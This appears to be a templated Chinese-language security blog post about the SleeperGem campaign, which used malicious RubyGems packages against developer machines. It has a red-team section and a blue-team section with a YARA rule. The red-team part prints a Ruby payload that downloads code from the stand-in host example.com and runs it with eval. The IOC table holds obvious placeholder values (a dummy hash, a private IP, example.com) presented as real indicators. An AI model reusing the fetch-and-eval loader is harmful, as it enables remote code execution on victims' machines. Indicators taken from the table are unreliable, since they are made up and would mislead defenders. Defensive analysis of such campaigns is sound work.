---
layout: post
title:  "SleeperGem Uses Three Malicious RubyGems Packages to Target Developer Machines"
date:   2026-07-20 08:45:23 +0000
categories: [security]
severity: critical
---

# 🚨 解析 SleeperGem 攻擊：RubyGems 軟體供應鏈攻擊的技術細節

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Malicious Gem, Software Supply Chain Attack, Persistence Mechanism

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: SleeperGem 攻擊利用了 RubyGems 的軟體供應鏈漏洞，攻擊者可以發佈惡意的 Gem 到 RubyGems 上，然後在使用者安裝這些 Gem 時執行惡意代碼。
* **攻擊流程圖解**:
  1. 攻擊者發佈惡意 Gem 到 RubyGems 上。
  2. 使用者安裝惡意 Gem。
  3. 惡意 Gem 執行惡意代碼，下載並執行第二階段的 payload。
  4. 第二階段的 payload 執行 persistence mechanism，確保惡意代碼可以持續執行。
* **受影響元件**: RubyGems、git_credential_manager (版本 2.8.0-2.8.3)、Dendreo (版本 1.1.3-1.1.4)、fastlane-plugin-run_tests_firebase_testlab (版本 0.3.2)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 RubyGems 帳戶，並且可以發佈 Gem 到 RubyGems 上。
* **Payload 建構邏輯**:

    ```
    
    ruby
    # 惡意 Gem 的 payload 範例
    require 'net/http'
    require 'uri'
    
    uri = URI('https://example.com/payload')
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true
    response = http.get(uri.request_uri)
    
    # 執行 payload
    eval(response.body)
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全防護，例如使用加密的 payload、使用不同的執行方式等。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /usr/local/bin/malicious_script |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_gem {
      meta:
        description = "Detects malicious Gem"
      strings:
        $a = "eval(response.body)"
      condition:
        $a
    }
    
    ```
* **緩解措施**: 使用者應該立即移除惡意 Gem，並更新 RubyGems 到最新版本。另外，使用者也應該檢查系統是否有任何惡意代碼，並進行適當的清除和修復。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Software Supply Chain Attack (軟體供應鏈攻擊)**: 惡意攻擊者針對軟體供應鏈的弱點，例如開源軟體的漏洞或第三方庫的安全問題，進行攻擊。
* **Persistence Mechanism (持續機制)**: 惡意代碼使用各種技術來確保自己可以持續執行，例如使用 cron 工作、系統服務等。
* **Malicious Gem (惡意 Gem)**: 惡意攻擊者發佈到 RubyGems 上的惡意 Gem，內含惡意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/sleepergem-uses-three-malicious.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1195/)


